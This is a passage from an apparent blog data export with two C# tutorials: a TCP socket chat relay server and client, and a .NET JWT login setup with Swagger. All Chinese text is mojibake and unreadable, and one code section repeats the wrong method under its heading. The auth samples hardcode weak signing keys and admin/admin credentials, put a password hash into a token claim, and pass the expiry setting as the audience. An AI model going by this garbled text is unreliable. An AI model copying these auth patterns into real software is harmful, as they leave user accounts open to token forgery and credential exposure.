Environment.NewLine); &#125; &#125;&#125; 3.å‘å®¢æˆ·ç«¯å‘æ¶ˆæ¯ 123456789101112131415public async Task AcceptClients()&#123; while (listening) &#123; try &#123; TcpClient client = await server.AcceptTcpClientAsync(); Task.Run(() =&gt; HandleClient(client)); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error accepting client: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125; &#125;&#125; 4.ç›‘å¬å®¢æˆ·ç«¯è¿æ¥123456789101112131415public async Task AcceptClients()&#123; while (listening) &#123; try &#123; TcpClient client = await server.AcceptTcpClientAsync(); Task.Run(() =&gt; HandleClient(client)); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error accepting client: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125; &#125;&#125; 5.å¤„ç†å®¢æˆ·ç«¯è¿æ¥1234567891011121314151617181920212223242526272829303132public async Task HandleClient(TcpClient client)&#123; NetworkStream stream = client.GetStream(); byte[] buffer = new byte[1024]; int bytesRead; while (client.Connected) &#123; try &#123; bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); string message = Encoding.ASCII.GetString(buffer, 0, bytesRead); ProcessMessage(message, client); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error receiving message: &#123;ex.Message&#125;&quot; + Environment.NewLine); break; &#125; &#125; // å®¢æˆ·ç«¯æ–­å¼€è¿æ¥æ—¶ï¼Œä»èŠå¤©å®¤ä¸­ç§»é™¤ foreach (var chatRoomId in chatRooms.Keys) &#123; if (chatRooms[chatRoomId].Contains(client)) &#123; chatRooms[chatRoomId].Remove(client); Console.WriteLine($&quot;Client disconnected from chat room &#123;chatRoomId&#125;&quot; + Environment.NewLine); break; &#125; &#125;&#125; 6.å¤„ç†è¿æ¥12345678910111213141516171819202122232425262728public async void ProcessMessage(string message, TcpClient client)&#123; string[] parts = message.Split(&#x27;|&#x27;); if (parts.Length &gt;= 2) &#123; string command = parts[0]; string chatRoomId = parts[1]; switch (command) &#123; case &quot;JoinChatRoom&quot;: await JoinChatRoom(chatRoomId, client); break; case &quot;SendMessageToChatRoomIP2&quot;: if (parts.Length &gt;= 4) &#123; string user = parts[2]; string msg = parts[3]; // await SendMessageToChatRoom(chatRoomId, user, msg); await SendMessageToChatRoomAddress(chatRoomId, user, msg, client); &#125; break; default: Console.WriteLine($&quot;Invalid command: &#123;command&#125;&quot; + Environment.NewLine); break; &#125; &#125;&#125; JoinChatRoom å¼‚æ­¥è°ƒç”¨æœåŠ¡ç«¯çš„JoinChatRoom SendMessageToChatRoomIP2 å¼‚æ­¥è°ƒç”¨SendMessage 7.è¿è¡Œæœ¬åœ°è¿è¡Œâ€‹ å‘å¸ƒåˆ°linuxâ€‹ run Server listening on port 10860 1netstat -tlnæŸ¥çœ‹ç«¯å£ ï¼ˆtulnï¼‰ ä¹Ÿå¯ä»¥ä¼˜åŒ–å°è£…æˆWinFormç¨‹åºï¼Œæ”¶å‘æ¶ˆæ¯å¯è§†åŒ–ã€‚ ç‚¹å‡»å¯åŠ¨socketç«¯å£è°ƒç”¨ 1.è¿æ¥websocket 2.ç›‘å¬socket â€‹ ä¹Ÿå¯ä»¥å°è£…æˆç³»ç»ŸæœåŠ¡ï¼Œä¸è¿›ç¨‹ä¸€æ ·è—åœ¨åå°è¿è¡Œã€‚ å®¢æˆ·ç«¯å®ç°1.è¿æ¥Socketç«¯12345678910111213141516171819private async void MainForm_Load(object sender, EventArgs e)&#123; try &#123; client = new TcpClient(); await client.ConnectAsync(&quot;192.168.80.123&quot;, 10086); stream = client.GetStream(); connected = true; // è¿æ¥æˆåŠŸåï¼Œè°ƒç”¨ JoinChatRoom æ–¹æ³•åŠ å…¥èŠå¤©å®¤ await JoinChatRoom(&quot;room001&quot;); Task.Run(ReceiveMessages); &#125; catch (Exception ex) &#123; textBoxReceivedMessages.AppendText($&quot;Error connecting to server: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125;&#125; 2.åŠ å…¥ChatRoomJoinChatRoomä¸­è½¬åˆ°Serverç«¯å†åŠ å…¥èŠå¤©å®¤ 123456private async Task JoinChatRoom(string chatRoomId) &#123; // å‘é€æ¶ˆæ¯ç»™ä¸­è½¬ç«¯ C1ï¼Œè¯·æ±‚åŠ å…¥èŠå¤©å®¤ byte[] data = Encoding.ASCII.GetBytes($&quot;JoinChatRoom|&#123;chatRoomId&#125;|J&quot;); await stream.WriteAsync(data, 0, data.Length); &#125; 3.å‘é€æ¶ˆæ¯å‘é€åˆ°Socketä¸­è½¬ç«¯ 123456private async Task SendMessageToChatRoom(string chatRoomId, string message)&#123; // å‘é€æ¶ˆæ¯ç»™ä¸­è½¬ç«¯ C1ï¼Œè¯·æ±‚å‘æŒ‡å®šèŠå¤©å®¤å‘é€æ¶ˆæ¯ byte[] data = Encoding.ASCII.GetBytes($&quot;SendMessageToChatRoomIP2|&#123;chatRoomId&#125;|client2m|&#123;message&#125;&quot;); await stream.WriteAsync(data, 0, data.Length);&#125; 4.æ¥æ”¶æ¶ˆæ¯123456789101112131415161718192021222324252627282930private async Task ReceiveMessages() &#123; byte[] buffer = new byte[1024]; int bytesRead; while (connected) &#123; try &#123; bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); string message = Encoding.ASCII.GetString(buffer, 0, bytesRead); DisplayMessage(message); &#125; catch (Exception ex) &#123; textBoxReceivedMessages.AppendText($&quot;Error receiving message: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125; &#125; &#125; private void DisplayMessage(string message) &#123; if (InvokeRequired) &#123; Invoke(new Action&lt;string&gt;(DisplayMessage), message); return; &#125; textBoxReceivedMessages.AppendText(message + Environment.NewLine); &#125; 5.ç‚¹å‡»äº‹ä»¶Send 12345678910111213141516171819202122private async void buttonSend_Click(object sender, EventArgs e) &#123; if (!connected) &#123; textBoxReceivedMessages.AppendText(&quot;Not connected to server.&quot; + Environment.NewLine); return; &#125; string message = textBoxSendMessage.Text; if (!string.IsNullOrEmpty(message)) &#123; // å‘é€æ¶ˆæ¯ç»™ä¸­è½¬ç«¯ C1ï¼Œè¯·æ±‚å‘èŠå¤©å®¤å‘é€æ¶ˆæ¯ await SendMessageToChatRoom(&quot;room001&quot;, message); textBoxSendMessage.Clear(); textBoxReceivedMessages.AppendText(&quot;Sent message to chat room: room001&quot; + Environment.NewLine); &#125; else &#123; textBoxReceivedMessages.AppendText(&quot;Please enter a message.&quot; + Environment.NewLine); &#125; &#125; 6.è¿è¡Œâ€‹ æœåŠ¡ç«¯å¯åŠ¨ Server listening on port 10086 æœåŠ¡ç«¯å‘æ”¶å‘æ¶ˆæ¯åˆ°ä¸­è½¬ç«¯ Sent message to chat room: room001client2m hihihi|socketclient 192.168.80.123 |::ffff:183.7.113.105|room001 ä¸­è½¬ç«¯æ‹¿åˆ°å®¢æˆ·ç«¯ä¿¡æ¯-&gt;WebSocketç«¯-&gt;ä¸­è½¬ç«¯æ¥æ”¶-&gt;å®¢æˆ·ç«¯æ¥æ”¶ Client joined chat room room001Received message from WSSserver_sr : client2m: hihihi|socketclient 192.168.80.123 |socketserver:::ffff:183.7.113.105|room001 å®¢æˆ·ç«¯ä¹Ÿå¯ä»¥ç”¨IOS SOCKET5å‘é€æ¶ˆæ¯ //... dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123; NSData * sendData = [@&quot;JoinChatRoom|room001&quot; dataUsingEncoding:NSUTF8StringEncoding]; [self.socket writeData:sendData withTimeout:-1 tag:1]; dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123; NSData * sendData = [@&quot;SendMessageToChatRoomIP2|room001|userid001|hello&quot; dataUsingEncoding:NSUTF8StringEncoding]; [self.socket writeData:sendData withTimeout:-1 tag:2]; [self.socket readDataWithTimeout:-1 tag:1]; &#125;); &#125;); //... Run â€‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":".NET JWT ","slug":"NET-JWT","date":"2024-04-18T17:26:35.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/19/NET-JWT/","permalink":"https://banjinmei.github.io/2024/04/19/NET-JWT/","excerpt":"","text":"å‰è¨€ JWT (JSON Web Token) æ˜¯ä¸€ç§å®‰å…¨ä¼ è¾“ä¿¡æ¯çš„å¼€æ”¾æ ‡å‡†ï¼Œç”±Headerã€Payloadå’ŒSignatureä¸‰éƒ¨åˆ†ç»„æˆã€‚å®ƒä¸»è¦ç”¨äºèº«ä»½éªŒè¯ã€ä¿¡æ¯äº¤æ¢å’Œæˆæƒã€‚JWTå¯éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œç¡®ä¿è®¿é—®æƒé™ï¼Œå®ç°å•ç‚¹ç™»å½•ï¼Œå¹¶åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å®‰å…¨åœ°äº¤æ¢ä¿¡æ¯ã€‚å› å…¶ç®€å•ã€å®‰å…¨å’Œä¾¿æ·ï¼ŒJWTåœ¨ç°ä»£Webåº”ç”¨ä¸­å¹¿æ³›ä½¿ç”¨ã€‚ ç”¨JWTæœ‰å¤šä¸ªåŸå› ï¼š æ— çŠ¶æ€çš„èº«ä»½éªŒè¯ï¼šJWTå…è®¸æœåŠ¡å™¨æ— éœ€ä¿å­˜ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ï¼Œå› ä¸ºæ‰€æœ‰å¿…è¦çš„ä¿¡æ¯éƒ½å­˜å‚¨åœ¨ä»¤ç‰Œæœ¬èº«ä¸­ã€‚è¿™é™ä½äº†æœåŠ¡å™¨çš„å­˜å‚¨éœ€æ±‚ï¼Œå¹¶æé«˜äº†ç³»ç»Ÿçš„å¯æ‰©å±•æ€§ã€‚ è·¨åŸŸèº«ä»½éªŒè¯ï¼šç”±äºJWTæ˜¯è‡ªæˆ‘åŒ…å«çš„ï¼Œå¹¶ä¸”å¯ä»¥è¢«è½»æ¾ä¼ é€’ï¼Œå› æ­¤å®ƒéå¸¸é€‚åˆè·¨åŸŸèº«ä»½éªŒè¯ã€‚ç”¨æˆ·å¯ä»¥åœ¨ä¸€ä¸ªæœåŠ¡ä¸ŠéªŒè¯èº«ä»½ï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„ä»¤ç‰Œè®¿é—®å¦ä¸€ä¸ªæœåŠ¡ï¼Œä»è€Œå®ç°å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰ã€‚ å®‰å…¨æ€§ï¼šJWTå¯ä»¥é€šè¿‡ä½¿ç”¨å¼ºå¤§çš„åŠ å¯†ç®—æ³•ï¼ˆå¦‚HS256, RS256ç­‰ï¼‰è¿›è¡Œç­¾åï¼Œä»¥ç¡®ä¿å…¶å®Œæ•´æ€§å’ŒçœŸå®æ€§ã€‚æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨å…¬é’¥éªŒè¯ä»¤ç‰Œçš„ç­¾åï¼Œä»è€Œç¡®ä¿å®ƒæ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œå¹¶ä¸”ç¡®å®æ˜¯ç”±å—ä¿¡ä»»çš„é¢å‘è€…ç­¾å‘çš„ã€‚ å‡å°‘æ•°æ®åº“æŸ¥è¯¢ï¼šç”±äºç”¨æˆ·çš„èº«ä»½ä¿¡æ¯éƒ½å­˜å‚¨åœ¨JWTä¸­ï¼ŒæœåŠ¡å™¨æ— éœ€æ¯æ¬¡éƒ½å»æ•°æ®åº“ä¸­æŸ¥è¯¢ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼Œä»è€Œå‡å°‘äº†æ•°æ®åº“çš„å‹åŠ›å’ŒæŸ¥è¯¢æ—¶é—´ã€‚ å¯å®šåˆ¶æ€§ï¼šJWTçš„Payloadéƒ¨åˆ†å¯ä»¥åŒ…å«è‡ªå®šä¹‰çš„ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·è§’è‰²ã€æƒé™ç­‰ï¼Œè¿™ä½¿å¾—JWTéå¸¸çµæ´»ï¼Œå¹¶å¯ä»¥æ ¹æ®å…·ä½“éœ€æ±‚è¿›è¡Œå®šåˆ¶ã€‚ æ˜“äºåˆ†å‘å’Œå…±äº«ï¼šJWTå¯ä»¥è½»æ¾åœ°é€šè¿‡ç½‘ç»œä¼ è¾“ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å¤šä¸ªæœåŠ¡å’Œå®¢æˆ·ç«¯ä¹‹é—´å…±äº«ï¼Œè¿™ä½¿å¾—å®ƒåœ¨å¾®æœåŠ¡æ¶æ„å’Œåˆ†å¸ƒå¼ç³»ç»Ÿä¸­éå¸¸æœ‰ç”¨ã€‚ æ ‡å‡†åŒ–å’Œäº’æ“ä½œæ€§ï¼šJWTæ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†ï¼ˆRFC 7519ï¼‰ï¼Œè¿™æ„å‘³ç€ä¸åŒçš„ç³»ç»Ÿå’Œè¯­è¨€éƒ½å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹å¼ç”Ÿæˆå’ŒéªŒè¯JWTï¼Œä»è€Œæé«˜äº†ç³»ç»Ÿçš„äº’æ“ä½œæ€§ã€‚ ç¯å¢ƒ Win10 VS2022 .NET8 âœ¨ å»ºç«‹é¡¹ç›®jwttest1.åˆ›å»ºTestJwtControllerâ€‹ 2.ä¸‹è½½JWTâ€‹ 3.å»ºå®ä½“ç±»123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/// &lt;summary&gt;/// ç”¨æˆ·ä¿¡æ¯ç±»/// &lt;/summary&gt;public class LoginRs&#123; /// &lt;summary&gt; /// ç”¨æˆ·ID /// &lt;/summary&gt; public string UserId &#123; get; set; &#125; /// &lt;summary&gt; /// ç”¨æˆ·å¯†ç  /// &lt;/summary&gt; public string PasswordMD5 &#123; get; set; &#125;&#125;/// &lt;summary&gt;/// ç”¨æˆ·ç™»å½•ä¿¡æ¯ç±»/// &lt;/summary&gt;public class LoginInfo&#123; /// &lt;summary&gt; /// ç”¨æˆ·ä¿¡æ¯ /// &lt;/summary&gt; public string UserId &#123; get; set; &#125; /// &lt;summary&gt; /// æ£€éªŒæ—¶é—´ /// &lt;/summary&gt; public DateTime Expires &#123; get; set; &#125;&#125;/// &lt;summary&gt;/// rsmodel/// &lt;/summary&gt;public class RsModel&#123; /// &lt;summary&gt; /// æ˜¯å¦æˆåŠŸ /// &lt;/summary&gt; public bool isOk &#123; get; set; &#125; /// &lt;summary&gt; /// è¿”å›å€¼ /// &lt;/summary&gt; public int code &#123; get; set; &#125; /// &lt;summary&gt; /// è¿”å›æ¶ˆæ¯ /// &lt;/summary&gt; public string msg &#123; get; set; &#125; /// &lt;summary&gt; /// è¿”å›æ•°æ® /// &lt;/summary&gt; public object rsData &#123; get; set; &#125; &#125; 4.æ·»åŠ post login12345678910111213141516171819202122232425262728// POST api/&lt;ValuesController&gt;[HttpPost]public string Login([FromBody] LoginRs loginRequest)&#123; if (loginRequest == null) return JsonConvert.SerializeObject(new RsModel() &#123; code = 0, isOk = false, msg = &quot;ç™»å½•ä¿¡æ¯ä¸ºç©ºï¼&quot; &#125;); #region åˆ¤æ–­userid pwd if (loginRequest.UserId != &quot;admin&quot; || loginRequest.PasswordMD5 != &quot;admin&quot;) &#123; return JsonConvert.SerializeObject(new RsModel() &#123; code = 0, isOk = false, msg = &quot;ç”¨æˆ·åå’Œå¯†ç ä¸æ­£ç¡®ï¼&quot; &#125;); &#125; #endregion LoginInfo Info = new LoginInfo() &#123; UserId = loginRequest.UserId, Expires = DateTime.Now.AddDays(1) &#125;; const string secretKey = &quot;myseckey&quot;;//å£ä»¤åŠ å¯†ç§˜é’¥ byte[] key = Encoding.UTF8.GetBytes(secretKey); IJwtAlgorithm algorithm = new HMACSHA256Algorithm();//åŠ å¯†æ–¹å¼ IJsonSerializer serializer = new JsonNetSerializer();//åºåˆ—åŒ–Json IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder();//base64åŠ è§£å¯† IJwtEncoder encoder = new JwtEncoder(algorithm, serializer, urlEncoder);//JWTç¼–ç  var token = encoder.Encode(Info, key);//ç”Ÿæˆä»¤ç‰Œ return JsonConvert.SerializeObject(new RsModel() &#123; code = 1, isOk = true, rsData = token, msg = &quot;ç™»å½•æˆåŠŸï¼&quot; &#125;);&#125; â€‹ 5.ç™»å½•éªŒè¯è¿™é‡Œä½¿ç”¨swaggeræ–¹ä¾¿æ£€éªŒ ğŸ‘‰ .NET MVC API Swaggerå…¥å‘ â€‹ 6.æµ‹è¯•æ²¡é—®é¢˜ï¼Œå†™ä¸ªJwtHelper12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public static class JwtHelper&#123; private static readonly string JwtKey = &quot;mysecret&quot;; /// &lt;summary&gt; /// è·å–åŠ å¯†è§£å¯† /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; private static IJwtEncoder GetEncoder() &#123; IJwtAlgorithm algorithm = new HMACSHA256Algorithm();//åŠ å¯†æ–¹å¼ IJsonSerializer serializer = new JsonNetSerializer();//åºåˆ—åŒ–Json IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder();//base64åŠ è§£å¯† IJwtEncoder encoder = new JwtEncoder(algorithm, serializer, urlEncoder);//JWTç¼–ç  return encoder; &#125; /// &lt;summary&gt; /// è·å–è§£å¯†å¯†é’¥ /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; private static IJwtDecoder GetDecoder() &#123; IJsonSerializer serializer = new JsonNetSerializer(); IDateTimeProvider provider = new UtcDateTimeProvider(); IJwtValidator validator = new JwtValidator(serializer, provider); IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder(); IJwtAlgorithm algorithm = new HMACSHA256Algorithm(); IJwtDecoder decoder = new JwtDecoder(serializer, validator, urlEncoder, algorithm); return decoder; &#125; /// &lt;summary&gt; /// åŠ å¯† /// &lt;/summary&gt; public static string Encode(object payload) &#123; var encoder = GetEncoder(); var token = encoder.Encode(payload, JwtKey); return token; &#125; /// &lt;summary&gt; /// è§£å¯† /// &lt;/summary&gt; public static T Decode&lt;T&gt;(string token) &#123; var decoder = GetDecoder(); var data = decoder.Decode(token, JwtKey); var res = JsonConvert.DeserializeObject&lt;T&gt;(data); return res; &#125; /// &lt;summary&gt; /// è§£å¯†ï¼Œåªè¿”å›Jsonæ–‡æœ¬ /// &lt;/summary&gt; /// &lt;param name=&quot;token&quot;&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static string Decode(string token) &#123; var decoder = GetDecoder(); var data = decoder.Decode(token, JwtKey); return data; &#125;&#125; â€‹æŠŠä¸­é—´çš„åŠ å¯†ç®—æ³•æ›¿æ¢æˆhelperçš„Encode 1var token = JwtHelper.Encode(Info); 7.æ·»åŠ tokenåŠ å¯†ç±»â€‹ è°ƒç”¨Decodeæ–¹æ³• è§£å¯†token 8.æµ‹è¯•JWTâ€‹ 1&#123;&quot;isOk&quot;:true,&quot;code&quot;:1,&quot;msg&quot;:&quot;ç™»å½•æˆåŠŸï¼&quot;,&quot;rsData&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySWQiOiJhZG1pbiIsIkV4cGlyZXMiOiIyMDI0LTA0LTEwVDAxOjUxOjUwLjk5NDgxNzQrMDA6MDAifQ.eYJovquJFezVhfdLp-Hro2vnMoQsUwgXLkYcZSYEy7U&quot;&#125; æµ‹è¯•è§£å¯† â€‹ è§£å¯†æˆåŠŸ â­ï¸JwtBearer9ã€æ·»åŠ NuGetåŒ…Microsoft.AspNetCore.Authentication.JwtBearerâ€‹ 10ã€åœ¨appsettings.jsonä¸­æ·»åŠ JWTé…ç½®èŠ‚ç‚¹12345&quot;JWT&quot;: &#123; &quot;SecKey&quot;: &quot;im6666666!#@$%@%^^&amp;*(~Czmjklneafguvioszb%yuv&amp;*6WVDf5dw#5dfw6f5w6faW%FW^f5wa65f^AWf56&quot;, //å¯†é’¥ &quot;Issuer&quot;: &quot;im666&quot;, //å‘è¡Œè€… &quot;ExpireSeconds&quot;: 7200 //è¿‡æœŸæ—¶é—´ 2h&#125;, 11.æ·»åŠ jwtç±» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121 using Microsoft.IdentityModel.Tokens; using System.Diagnostics; using System.IdentityModel.Tokens.Jwt; using System.Security.Claims; using System.Text; namespace webapijwttest.Models&#123; /// &lt;summary&gt; /// æˆæƒJWTç±» /// &lt;/summary&gt; public class JwtHelper2 &#123; private readonly IConfiguration _configuration; /// &lt;summary&gt; /// Tokené…ç½® /// &lt;/summary&gt; /// &lt;param name=&quot;configuration&quot;&gt;&lt;/param&gt; public JwtHelper2(IConfiguration configuration) &#123; _configuration = configuration; &#125; /// &lt;summary&gt; /// åˆ›å»ºToken è¿™é‡Œé¢å¯ä»¥ä¿å­˜è‡ªå·±æƒ³è¦çš„ä¿¡æ¯ /// &lt;/summary&gt; /// &lt;param name=&quot;username&quot;&gt;&lt;/param&gt; /// &lt;param name=&quot;mobile&quot;&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public string CreateToken(string username, string mobile) &#123; try &#123; // 1. å®šä¹‰éœ€è¦ä½¿ç”¨åˆ°çš„Claims var claims = new[] &#123; new Claim(&quot;username&quot;, username), new Claim(&quot;mobile&quot;, mobile), /* å¯ä»¥ä¿å­˜è‡ªå·±æƒ³è¦ä¿¡æ¯ï¼Œä¼ å‚è¿›æ¥å³å¯ new Claim(&quot;sex&quot;, &quot;sex&quot;), new Claim(&quot;limit&quot;, &quot;limit&quot;), new Claim(&quot;head_url&quot;, &quot;xxxxx&quot;) */ &#125;; // 2. ä» appsettings.json ä¸­è¯»å–SecretKey var secretKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration[&quot;Jwt:SecKey&quot;])); // 3. é€‰æ‹©åŠ å¯†ç®—æ³• var algorithm = SecurityAlgorithms.HmacSha256; // 4. ç”ŸæˆCredentials var signingCredentials = new SigningCredentials(secretKey, algorithm); // 5. æ ¹æ®ä»¥ä¸Šï¼Œç”Ÿæˆtoken var jwtSecurityToken = new JwtSecurityToken( _configuration[&quot;Jwt:Issuer&quot;], //Issuer _configuration[&quot;Jwt:ExpireSeconds&quot;], //ExpireSeconds claims, //Claims, DateTime.Now, //notBefore DateTime.Now.AddSeconds(30), //expires signingCredentials //Credentials ); // 6. å°†tokenå˜ä¸ºstring var token = new JwtSecurityTokenHandler().WriteToken(jwtSecurityToken); return token; &#125; catch (Exception) &#123; throw; &#125; &#125; /// &lt;summary&gt; /// è·å–ä¿¡æ¯ /// &lt;/summary&gt; /// &lt;param name=&quot;jwt&quot;&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static string ReaderToken(string jwt) &#123; var str = string.Empty; try &#123; //è·å–Tokençš„ä¸‰ç§æ–¹å¼ //ç¬¬ä¸€ç§ç›´æ¥ç”¨JwtSecurityTokenHandleræä¾›çš„readæ–¹æ³• var jwtHander = new JwtSecurityTokenHandler(); JwtSecurityToken jwtSecurityToken = jwtHander.ReadJwtToken(jwt); str = jwtSecurityToken.ToString(); &#125; catch (Exception ex) &#123; Debug.WriteLine(ex.Message); &#125; return str; &#125; /// &lt;summary&gt; /// è§£å¯†jwt /// &lt;/summary&gt; /// &lt;param name=&quot;jwt&quot;&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public string JwtDecrypt(string jwt) &#123; StringBuilder sb = new StringBuilder(); try &#123; JwtSecurityTokenHandler tokenHandler = new(); TokenValidationParameters valParam = new(); var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration[&quot;Jwt:SecKey&quot;])); valParam.IssuerSigningKey = securityKey; valParam.ValidateIssuer = false; valParam.ValidateAudience = false; //è§£å¯† ClaimsPrincipal claimsPrincipal = tokenHandler.ValidateToken(jwt, valParam, out SecurityToken secToken); foreach (var claim in claimsPrincipal.Claims) &#123; sb.Append($&quot;&#123;claim.Type&#125;=&#123;claim.Value&#125;&quot;); &#125; &#125; catch (Exception ex) &#123; Debug.WriteLine(ex.Message); &#125; return sb.ToString(); &#125; &#125;&#125; 12.Program.csæ³¨å†ŒJWTæœåŠ¡1234567891011121314151617181920#region JWTæœåŠ¡// æ³¨å†ŒJWTæœåŠ¡builder.Services.AddSingleton(new JwtHelper2(builder.Configuration));builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(options =&gt;&#123; options.TokenValidationParameters = new TokenValidationParameters() &#123; ValidateIssuer = true, //æ˜¯å¦éªŒè¯Issuer ValidIssuer = builder.Configuration[&quot;Jwt:Issuer&quot;], //å‘è¡ŒäººIssuer ValidateAudience = false, //æ˜¯å¦éªŒè¯Audience ValidateIssuerSigningKey = true, //æ˜¯å¦éªŒè¯SecurityKey IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(builder.Configuration[&quot;Jwt:SecKey&quot;])), //SecurityKey ValidateLifetime = true, //æ˜¯å¦éªŒè¯å¤±æ•ˆæ—¶é—´ ClockSkew = TimeSpan.FromSeconds(30), //è¿‡æœŸæ—¶é—´å®¹é”™å€¼ï¼Œè§£å†³æœåŠ¡å™¨ç«¯æ—¶é—´ä¸åŒæ­¥é—®é¢˜ï¼ˆç§’ï¼‰ RequireExpirationTime = true, &#125;;&#125;);#endregion æ·»åŠ swagger authorization 12345678910111213141516171819202122232425262728293031builder.Services.AddSwaggerGen(c =&gt;&#123; c.SwaggerDoc(&quot;v1&quot;, new OpenApiInfo &#123; Title = &quot;Web API&quot;, Version = &quot;v1&quot; &#125;); //å¼€å¯æ³¨é‡Š var xmlFile = $&quot;&#123;Assembly.GetEntryAssembly().GetName().Name&#125;.xml&quot;; var xmlPath = Path.Combine(AppContext.BaseDirectory, xmlFile);//éœ€è¦ ç”Ÿæˆ ç›®å½•ç”ŸæˆXML c.IncludeXmlComments(xmlPath, true); // é…ç½® JWT Bearer æˆæƒ c.AddSecurityDefinition(&quot;Bearer&quot;, new OpenApiSecurityScheme &#123; Description = &quot;JWT Authorization header using the Bearer scheme&quot;, Name = &quot;Authorization&quot;, In = ParameterLocation.Header, Type = SecuritySchemeType.Http, Scheme = &quot;bearer&quot; &#125;); var securityScheme = new OpenApiSecurityScheme &#123; Reference = new OpenApiReference &#123; Type = ReferenceType.SecurityScheme, Id = &quot;Bearer&quot; &#125; &#125;; var securityRequirement = new OpenApiSecurityRequirement &#123; &#123; securityScheme, new string[] &#123; &#125; &#125; &#125;; c.AddSecurityRequirement(securityRequirement); &#125;); var app = builder.Build(); //å¯ç”¨éªŒè¯ä¸­é—´ä»¶app.UseAuthentication();app.UseAuthorization(); 13.æ·»åŠ jwtæµ‹è¯•api12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758using Microsoft.AspNetCore.Authorization;using Microsoft.AspNetCore.Identity.Data;using Microsoft.AspNetCore.Mvc;using webapijwttest.Models;namespace webapijwttest.Controllers&#123; [Route(&quot;api/[controller]/[action]&quot;)] [ApiController] public class Jwt2Controller : ControllerBase &#123; private readonly JwtHelper2 _jwt; /// &lt;summary&gt; /// åˆå§‹åŒ– /// &lt;/summary&gt; /// &lt;param name=&quot;jwtHelper&quot;&gt;&lt;/param&gt; public Jwt2Controller(JwtHelper2 jwtHelper) &#123; _jwt = jwtHelper; &#125; /// &lt;summary&gt; /// è·å–Token /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; [HttpPost] public IActionResult GetToken(LoginRs user) &#123; //å‚æ•°éªŒè¯ç­‰ç­‰.... if (string.IsNullOrEmpty(user.UserId)) &#123; return Ok(&quot;å‚æ•°å¼‚å¸¸ï¼&quot;); &#125; //è¿™é‡Œå¯ä»¥è¿æ¥mysqlæ•°æ®åº“åšè´¦å·å¯†ç éªŒè¯ //è¿™é‡Œå¯ä»¥åšRedisç¼“å­˜éªŒè¯ç­‰ç­‰ //è¿™é‡Œè·å–Tokenï¼Œå½“ç„¶ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥é€‰æ‹©ä¼ ç»“æ„ä½“è¿‡å» var token = _jwt.CreateToken(user.UserId, user.PasswordMD5); //è§£å¯†åçš„Token var PWToken = _jwt.JwtDecrypt(token); return Ok(token + &quot;è§£å¯†åï¼š&quot; + PWToken); &#125; /// &lt;summary&gt; /// è·å–è‡ªå·±çš„è¯¦ç»†ä¿¡æ¯ï¼Œå…¶ä¸­ [Authorize] å°±è¡¨ç¤ºè¦å¸¦Tokenæ‰è¡Œ /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; [HttpPost] [Authorize] public IActionResult GetSelfInfo() &#123; //æ‰§è¡Œåˆ°è¿™é‡Œï¼Œå°±è¡¨ç¤ºå·²ç»éªŒè¯æˆæƒé€šè¿‡äº† /* * è¿™é‡Œè¿”å›ä¸ªäººä¿¡æ¯æœ‰ä¸¤ç§æ–¹å¼ * ç¬¬ä¸€ç§ï¼šä»Headerä¸­çš„Tokenä¿¡æ¯åå‘è§£æå‡ºç”¨æˆ·è´¦å·ï¼Œå†ä»æ•°æ®åº“ä¸­æŸ¥æ‰¾è¿”å› * 